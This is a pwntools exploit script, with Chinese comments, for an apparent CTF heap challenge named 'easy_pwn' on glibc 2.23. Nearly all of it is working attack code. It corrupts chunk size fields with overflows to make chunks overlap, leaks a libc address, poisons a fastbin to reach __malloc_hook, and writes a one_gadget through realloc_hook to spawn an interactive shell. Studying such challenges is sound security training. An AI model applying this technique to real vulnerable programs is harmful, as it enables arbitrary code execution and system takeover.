# encoding: utf-8
from pwn import*

elf = ELF("./easy_pwn")
libc = ELF("./libc-2.23.so")
local = 0
if local:
    p = remote()
else:
    p = process('./easy_pwn')
    
def add(size):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("size:")
    p.sendline(str(size))

def edit(idx,size,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index: ")
    p.sendline(str(idx))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.sendline(content)

def delete(idx):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("index: ")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("index: ")
    p.sendline(str(idx))


add(24) #0
add(64) #1
add(64) #2
add(48) #3防止unsortbin和topchunk合并
edit(0,34,'aaaaaaaaaaaaaaaaaaaaaaaa'+'\xA1')
delete(1)
add(64) #1
show(2)
addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) #接收泄露地址的常规操作
libc_base = addr -0x3c4b78
print 'libc:'+hex(libc_base)
__free_hook = libc_base + libc.symbols['__free_hook']
__malloc_hook = libc_base + libc.symbols['__malloc_hook']


one =  libc_base+0x4526a#
add(0x40)

add(0x38) # 5
add(0x38) # 6
add(0x68) # 7
add(0x38) # 8
delete(7)
edit(5,0x38 + 0xa,'a' * 0x38 + chr(0xb1))
delete(6)
add(0xa1) # 6
edit(6,0x48,'a' * 0x30 + p64(0x0) + p64(0x71) + p64(__malloc_hook - 0x23))
add(0x60) #7   
add(0x60) # 9
realloc = libc_base + libc.symbols['realloc']
edit(9,0x18 + 3 , '\x00' * (0x3 + 0x8) + p64(0x4526a + libc_base) + p64(realloc + 0x0))
# realloc_hook在malloc_hook前面两个字节
#这里是利用onegadget覆盖realloc_hook，覆盖malloc_hook为realloc的地址
#realloc函数开始有一系列的堆栈操作, 劫持到realloc或者realloc+2/4/6/8/12/20等等开始执行
#可以控制堆栈的抬高与降低，使得最终执行one_gadget时符合栈上[rsp+xxx]=NULL的约束。
p.sendline("1")
sleep(0.3)
p.sendline("1")
p.interactive()
